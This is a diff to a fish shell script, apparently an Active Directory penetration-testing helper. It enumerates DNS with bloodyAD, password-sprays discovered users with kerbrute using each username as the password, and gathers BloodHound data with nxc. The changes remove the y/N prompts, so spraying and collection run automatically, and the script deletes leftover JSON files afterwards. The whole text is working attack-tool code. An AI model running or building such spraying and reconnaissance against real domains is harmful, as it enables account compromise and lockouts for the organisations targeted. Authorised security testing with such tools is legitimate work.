@@ -135,9 +135,7 @@ Examples:
 
     # Build bloodyAD authentication
     if command -v bloodyAD >/dev/null 2>&1
-        if set -q _flag_kerb -a -n "$dc_fqdn"
-            set bloody_auth --host $dc_fqdn -dc-ip $target -d $domain -u $user
-        else
+        if set -q _flag_kerb
             set bloody_auth --host $target -d $domain -u $user
         end
         
@@ -300,18 +298,16 @@ Examples:
         end
     end
 
-    ezpz_question "Bruteforce all discovered users with username as password? [y/N]"
-    read -l confirm
-    or set confirm "n" # Default to no if timeout
-    set confirm (string trim $confirm)
-    if test "$confirm" = "y" -o "$confirm" = "Y"
+    if command -v kerbrute >/dev/null 2>&1
+        ezpz_header "Bruteforcing credentials with username as password"
         if test -s $users_tmp
-            ezpz_header "Starting username-as-password bruteforce..."
             ezpz_cmd "kerbrute passwordspray --dc $domain -d $domain $users_tmp --user-as-pass"
             kerbrute passwordspray --dc $domain -d $domain $users_tmp --user-as-pass | grep -oE "VALID LOGIN.*"
         else
             ezpz_error "User list is empty. Run RID bruteforce first. Skipping."
         end
+    else
+        ezpz_warn "Kerbrute not found. Skipping username-as-password bruteforce."
     end
 
     ezpz_title "Looking for interesting domain configuration and services..."
@@ -373,11 +369,7 @@ Examples:
     # DNS Dump using bloodyAD
     if command -v bloodyAD >/dev/null 2>&1
         ezpz_header "Enumerating DNS records"
-        if set -q _flag_kerb -a -n "$dc_fqdn"
-            ezpz_cmd "bloodyAD --host $dc_fqdn -d $domain -u $user -k get dnsDump"
-        else
-            ezpz_cmd "bloodyAD $bloody_auth get dnsDump"
-        end
+        ezpz_cmd "bloodyAD $bloody_auth get dnsDump"
         timeout 60 bloodyAD $bloody_auth get dnsDump 2>/dev/null | awk '
         {
             if (/^recordName:/) {
@@ -409,28 +401,20 @@ Examples:
 
     ezpz_title "Starting data collection..."
 
-    ezpz_question "Ingest data for Bloodhound? [y/N]"
-    read -l confirm
-    or set confirm "n" # Default to no if timeout
-    set confirm (string trim $confirm)
-    if test "$confirm" = "y" -o "$confirm" = "Y"
-        ezpz_header "Ingesting AD data for BloodHound"
-        ezpz_cmd "nxc ldap $nxc_auth --bloodhound --collection All --dns-server $target"
-
-        set zip_path (nxc ldap $nxc_auth --bloodhound --collection All --dns-server $target 2>/dev/null | grep -oE '/[^ ]+_bloodhound\.zip' | tail -1)
-
-        if test -n "$zip_path" -a -f "$zip_path"
-            set dest_zip "./$file_domain"_bloodhound.zip
-            mv $zip_path $dest_zip
-            ezpz_info "Saving data to $dest_zip"
-            
-            # Remove JSON files created in the last minute (BloodHound artifacts)
-            find . -maxdepth 1 -name "*.json" -mmin -1 -delete 2>/dev/null
-            # Also remove any files matching BloodHound naming pattern
-            find . -maxdepth 1 -name "*_*_*_*_*.json" -delete 2>/dev/null
-        else
-            ezpz_error "Could not find BloodHound zip output!"
-        end
+    ezpz_header "Ingesting AD data for BloodHound"
+    ezpz_cmd "nxc ldap $nxc_auth --bloodhound --collection All --dns-server $target"
+    set zip_path (nxc ldap $nxc_auth --bloodhound --collection All --dns-server $target 2>/dev/null | grep -oE '/[^ ]+_bloodhound\.zip' | tail -1)
+    if test -n "$zip_path" -a -f "$zip_path"
+        set dest_zip "./$file_domain"_bloodhound.zip
+        mv $zip_path $dest_zip
+        ezpz_info "Saving data to $dest_zip"
+        
+        # Remove JSON files created in the last minute (BloodHound artifacts)
+        find . -maxdepth 1 -name "*.json" -mmin -1 -delete 2>/dev/null
+        # Also remove any files matching BloodHound naming pattern
+        find . -maxdepth 1 -name "*_*_*_*_*.json" -delete 2>/dev/null
+    else
+        ezpz_error "Could not find BloodHound zip output!"
     end
 
     ezpz_success "Done."
